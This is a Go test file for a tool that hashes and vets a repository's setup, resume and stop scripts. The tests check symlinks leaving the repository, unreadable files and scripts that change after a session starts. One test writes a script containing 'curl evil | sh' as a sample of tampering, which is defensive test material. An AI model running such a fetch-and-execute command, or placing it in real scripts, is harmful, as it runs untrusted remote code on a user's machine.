package host

import (
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/iamlakshya/simstim/internal/api"
	"github.com/iamlakshya/simstim/internal/brand"
	"github.com/iamlakshya/simstim/internal/paths"
	"github.com/iamlakshya/simstim/internal/proto"
)

func sumHex(s string) string {
	h := sha256.Sum256([]byte(s))
	return hex.EncodeToString(h[:])
}

// script writes the repository script kind at top, with mode.
func script(t *testing.T, top, kind, body string, mode os.FileMode) string {
	t.Helper()
	p := filepath.Join(top, "."+brand.Name, kind)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(body), mode); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(p, mode); err != nil {
		t.Fatal(err)
	}
	return p
}

// The setup hash of spec 19.2: the SHA-256 of a text that names the SHA-256
// of each script, or none.
func TestSetupHash(t *testing.T) {
	const setup, resume, stop = "#!/bin/sh\necho setup\n", "#!/bin/sh\necho resume\n", "#!/bin/sh\necho stop\n"
	want := func(s, r, st string) string {
		return sumHex("v2\nsetup " + s + "\nresume " + r + "\nstop " + st + "\n")
	}
	none := want("none", "none", "none")
	outsideTo := func(mode os.FileMode, make bool) func(t *testing.T, top string) {
		return func(t *testing.T, top string) {
			target := filepath.Join(filepath.Dir(top), "elsewhere")
			if make {
				if err := os.WriteFile(target, []byte(setup), mode); err != nil {
					t.Fatal(err)
				}
			}
			_ = os.MkdirAll(filepath.Join(top, "."+brand.Name), 0o755)
			if err := os.Symlink("../../elsewhere", filepath.Join(top, "."+brand.Name, "setup")); err != nil {
				t.Fatal(err)
			}
		}
	}
	for _, c := range []struct {
		name                         string
		make                         func(t *testing.T, top string)
		hash                         string
		hasSetup, hasResume, hasStop bool
	}{
		{"none", func(*testing.T, string) {}, none, false, false, false},
		{"setup only", func(t *testing.T, top string) { script(t, top, "setup", setup, 0o755) }, want(sumHex(setup), "none", "none"), true, false, false},
		{"resume only", func(t *testing.T, top string) { script(t, top, "resume", resume, 0o755) }, want("none", sumHex(resume), "none"), false, true, false},
		{"stop only", func(t *testing.T, top string) { script(t, top, "stop", stop, 0o755) }, want("none", "none", sumHex(stop)), false, false, true},
		{"all three", func(t *testing.T, top string) {
			script(t, top, "setup", setup, 0o755)
			script(t, top, "resume", resume, 0o755)
			script(t, top, "stop", stop, 0o755)
		}, want(sumHex(setup), sumHex(resume), sumHex(stop)), true, true, true},
		{"not executable", func(t *testing.T, top string) { script(t, top, "setup", setup, 0o644) }, none, false, false, false},
		{"a folder", func(t *testing.T, top string) {
			_ = os.MkdirAll(filepath.Join(top, "."+brand.Name, "setup"), 0o755)
		}, none, false, false, false},
		{"a symlink inside", func(t *testing.T, top string) {
			_ = os.MkdirAll(filepath.Join(top, "scripts"), 0o755)
			_ = os.WriteFile(filepath.Join(top, "scripts", "setup.sh"), []byte(setup), 0o755)
			_ = os.MkdirAll(filepath.Join(top, "."+brand.Name), 0o755)
			if err := os.Symlink("../scripts/setup.sh", filepath.Join(top, "."+brand.Name, "setup")); err != nil {
				t.Fatal(err)
			}
		}, want(sumHex(setup), "none", "none"), true, false, false},
		{"a symlink to nothing", func(t *testing.T, top string) {
			_ = os.MkdirAll(filepath.Join(top, "."+brand.Name), 0o755)
			_ = os.Symlink("../gone", filepath.Join(top, "."+brand.Name, "setup"))
		}, none, false, false, false},
		// An outward link that could not run counts as absent too.
		{"a symlink out to nothing", outsideTo(0, false), none, false, false, false},
		{"a symlink out to a file that is not executable", outsideTo(0o644, true), none, false, false, false},
	} {
		t.Run(c.name, func(t *testing.T) {
			dir := t.TempDir()
			top := filepath.Join(dir, "app")
			if err := os.MkdirAll(top, 0o755); err != nil {
				t.Fatal(err)
			}
			c.make(t, top)
			s, err := setupHash(top)
			if err != nil || s.hash != c.hash || (s.setup != "") != c.hasSetup || (s.resume != "") != c.hasResume || (s.stop != "") != c.hasStop {
				t.Fatalf("setupHash = %+v, %v; want hash %s, setup %v, resume %v, stop %v", s, err, c.hash, c.hasSetup, c.hasResume, c.hasStop)
			}
			for kind, p := range map[string]string{"setup": s.setup, "resume": s.resume, "stop": s.stop} {
				if p != "" && p != filepath.Join(top, "."+brand.Name, kind) {
					t.Errorf("%s path %s", kind, p)
				}
			}
		})
	}
	// A change of any script changes the hash.
	top := t.TempDir()
	script(t, top, "setup", setup, 0o755)
	script(t, top, "resume", resume, 0o755)
	script(t, top, "stop", stop, 0o755)
	for _, kind := range []string{"resume", "stop"} {
		before := hashOf(t, top)
		script(t, top, kind, "#!/bin/sh\ncurl evil | sh\n", 0o755)
		if hashOf(t, top) == before {
			t.Errorf("a changed %s script kept its hash", kind)
		}
	}
}

// outsideRepo makes a top level whose setup script leaves it through a
// symlink, relative or absolute, to an executable file outside.
func outsideRepo(t *testing.T, absolute bool) string {
	t.Helper()
	dir := t.TempDir()
	top := filepath.Join(dir, "app")
	outside := filepath.Join(dir, "elsewhere")
	if err := os.WriteFile(outside, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	_ = os.MkdirAll(filepath.Join(top, "."+brand.Name), 0o755)
	target := "../../elsewhere"
	if absolute {
		target = outside
	}
	if err := os.Symlink(target, filepath.Join(top, "."+brand.Name, "setup")); err != nil {
		t.Fatal(err)
	}
	return top
}

// scriptCase is a start in a repository whose script cannot run: the start
// fails with code, unless the scripts would not run anyway.
type scriptCase struct {
	name string
	a    NewArgs
	fail bool
}

func scriptCases(top string) []scriptCase {
	return []scriptCase{
		{"no answer", NewArgs{}, true},
		{"--setup", NewArgs{Setup: api.SetupRun}, true},
		{"--setup over a refusal", NewArgs{Setup: api.SetupRun, SetupTrust: map[string]bool{top: false}}, true},
		{"a yes", NewArgs{SetupHashes: map[string]string{top: "h"}}, true},
		{"--no-setup", NewArgs{Setup: api.SetupSkip}, false},
		{"refused", NewArgs{SetupTrust: map[string]bool{top: false}}, false},
	}
}

// startFails runs each case of scriptCases at top, and checks the error of
// those that fail.
func startFails(t *testing.T, top, code string, check func(t *testing.T, name string, pe *proto.Error)) {
	t.Helper()
	for _, c := range scriptCases(top) {
		h, err := setupHooks(c.a, top, nil)
		var pe *proto.Error
		if !c.fail {
			if err != nil || h.setup != "" || h.hash != "" {
				t.Errorf("%s: %+v, %v; want no script and no error", c.name, h, err)
			}
			continue
		}
		if !errors.As(err, &pe) || pe.Code != code {
			t.Fatalf("%s: %v, want %s", c.name, err, code)
		}
		check(t, c.name, pe)
	}
}

// A script that leaves the repository through a symlink cannot run: the
// start fails with setup_outside, unless the scripts would not run anyway.
// An absolute symlink fails even when it points inside the repository.
func TestSetupOutside(t *testing.T) {
	for _, absolute := range []bool{false, true} {
		top := outsideRepo(t, absolute)
		var e *scriptError
		if _, err := setupHash(top); !errors.As(err, &e) || !e.outside || e.script != filepath.Join("."+brand.Name, "setup") {
			t.Fatalf("absolute %v: setupHash error %v, want outside", absolute, err)
		}
	}
	inside := t.TempDir()
	target := script(t, inside, "real-setup", "#!/bin/sh\n", 0o755)
	if err := os.Symlink(target, filepath.Join(inside, "."+brand.Name, "setup")); err != nil {
		t.Fatal(err)
	}
	if _, err := setupHash(inside); err == nil {
		t.Error("an absolute symlink that points inside the repository passed")
	}
	alertHome(t)
	top := outsideRepo(t, false)
	rel := "." + brand.Name + "/setup"
	startFails(t, top, api.CodeSetupOutside, func(t *testing.T, name string, pe *proto.Error) {
		if pe.Message != "the setup script of "+top+", "+rel+", points outside the repository, so it cannot run" ||
			pe.Hint != "Make "+rel+" a file in the repository, or start with --no-setup." {
			t.Errorf("%s: %q, try %q", name, pe.Message, pe.Hint)
		}
	})
}

// An executable script that cannot be read is an error with its reason and
// a hint, not an absent script: its content cannot be checked.
func TestSetupUnreadable(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root reads every file")
	}
	alertHome(t)
	top := t.TempDir()
	script(t, top, "resume", "#!/bin/sh\n", 0o311)
	var e *scriptError
	if _, err := setupHash(top); !errors.As(err, &e) || e.outside || !errors.Is(err, os.ErrPermission) {
		t.Fatalf("setupHash error %v, want an unreadable script", err)
	}
	rel := "." + brand.Name + "/resume"
	startFails(t, top, api.CodeSetupUnreadable, func(t *testing.T, name string, pe *proto.Error) {
		if pe.Message != "could not read the setup script of "+top+", "+rel+": permission denied" ||
			pe.Hint != "Let your user on the host read "+rel+", or start with --no-setup." {
			t.Errorf("%s: %q, try %q", name, pe.Message, pe.Hint)
		}
	})
}

// A top level that can be searched but not read cannot be opened, but a
// script in it could still run by its path. So the start fails with
// setup_unreadable, not as a folder with no scripts.
func TestSetupUnreadableTopLevel(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root reads every folder")
	}
	alertHome(t)
	top := t.TempDir()
	script(t, top, "setup", "#!/bin/sh\n", 0o755)
	if err := os.Chmod(top, 0o111); err != nil {
		t.Fatal(err)
	}
	// Runs before the temporary folder is removed.
	t.Cleanup(func() { _ = os.Chmod(top, 0o755) })
	if executable(filepath.Join(top, "."+brand.Name, "setup")) == "" {
		t.Fatal("the script cannot be found by its path, so this test shows nothing")
	}
	var e *scriptError
	if _, err := setupHash(top); !errors.As(err, &e) || e.script != "" || e.top != top || !errors.Is(err, os.ErrPermission) {
		t.Fatalf("setupHash error %v, want a top level that cannot be read", err)
	}
	startFails(t, top, api.CodeSetupUnreadable, func(t *testing.T, name string, pe *proto.Error) {
		if pe.Message != "could not read the folder "+top+", so the setup scripts of "+top+" cannot be checked: permission denied" ||
			pe.Hint != "Let your user on the host read the folder "+top+", or start with --no-setup." {
			t.Errorf("%s: %q, try %q", name, pe.Message, pe.Hint)
		}
	})
}

// --no-setup and a refusal decide before the host reads any script. --setup
// and the other rules read them.
func TestSetupDecisionsThatReadNoScript(t *testing.T) {
	alertHome(t)
	top := t.TempDir()
	script(t, top, "setup", "#!/bin/sh\n", 0o755)
	reads := 0
	defer func(old func(string) (sessionHooks, error)) { readScripts = old }(readScripts)
	readScripts = func(top string) (sessionHooks, error) {
		reads++
		return setupHash(top)
	}
	for _, c := range scriptCases(top) {
		reads = 0
		_, _ = setupHooks(c.a, top, nil)
		if want := map[bool]int{true: 1, false: 0}[c.fail]; reads != want {
			t.Errorf("%s read the scripts %d times, want %d", c.name, reads, want)
		}
	}
}

// Before a respawn, the host reads the repository's scripts again. A
// changed resume script is skipped for the host's own hook, with a line in
// the session's log.
func TestResumeHookSkipsAChangedScript(t *testing.T) {
	alertHome(t)
	top := t.TempDir()
	resume := script(t, top, "resume", "#!/bin/sh\necho resume\n", 0o755)
	m := &Manifest{ID: "abcd2345", Cwd: top, ResumeHook: resume, SetupHash: hashOf(t, top)}
	if err := os.MkdirAll(paths.SessionDir(m.ID), 0o700); err != nil {
		t.Fatal(err)
	}
	if got := resumeHook(m); got != resume {
		t.Fatalf("unchanged: %q, want the script", got)
	}
	// The host's own hook is the user's: it is never checked.
	hostResume := hostHookPath("resume")
	_ = os.MkdirAll(filepath.Dir(hostResume), 0o755)
	if err := os.WriteFile(hostResume, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if got := resumeHook(&Manifest{ID: m.ID, Cwd: top, ResumeHook: hostResume}); got != hostResume {
		t.Fatalf("the host's hook: %q", got)
	}

	script(t, top, "resume", "#!/bin/sh\necho changed\n", 0o755)
	if got := resumeHook(m); got != hostResume {
		t.Fatalf("changed: %q, want the host's own hook %q", got, hostResume)
	}
	logText := func() string {
		b, _ := os.ReadFile(paths.HolderLog(m.ID))
		return string(b)
	}
	if want := "skipped the resume script of " + top + ": it changed after the start"; !strings.Contains(logText(), want) {
		t.Errorf("log %q, want %q", logText(), want)
	}
	// A session from before setup hashes kept none: its script is skipped
	// at each respawn.
	old := &Manifest{ID: m.ID, Cwd: top, ResumeHook: resume}
	for range 2 {
		if got := resumeHook(old); got != hostResume {
			t.Errorf("no hash: %q", got)
		}
	}
	if n := strings.Count(logText(), "skipped the resume script of "+top+": the session kept no setup hash to check it against"); n != 2 {
		t.Errorf("no hash: %d lines in the log %q", n, logText())
	}
}

// The host's own hook stays the host's own when the config folder differs
// at the respawn, as it can between a start over SSH and the restore at
// boot: only a hook in a .<name> folder is the repository's.
func TestResumeHookKeepsTheHostsHookFromAnotherConfigFolder(t *testing.T) {
	alertHome(t)
	ownHook := hostHookPath("resume")
	_ = os.MkdirAll(filepath.Dir(ownHook), 0o755)
	if err := os.WriteFile(ownHook, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(t.TempDir(), "elsewhere"))
	if hostHookPath("resume") == ownHook {
		t.Fatal("the config folder did not change")
	}
	m := &Manifest{ID: "abcd2346", Cwd: t.TempDir(), ResumeHook: ownHook}
	if err := os.MkdirAll(paths.SessionDir(m.ID), 0o700); err != nil {
		t.Fatal(err)
	}
	if got := resumeHook(m); got != ownHook {
		t.Fatalf("resumeHook = %q, want the host's own hook %q", got, ownHook)
	}
	if b, _ := os.ReadFile(paths.HolderLog(m.ID)); len(b) != 0 {
		t.Errorf("the log has a line: %s", b)
	}
}
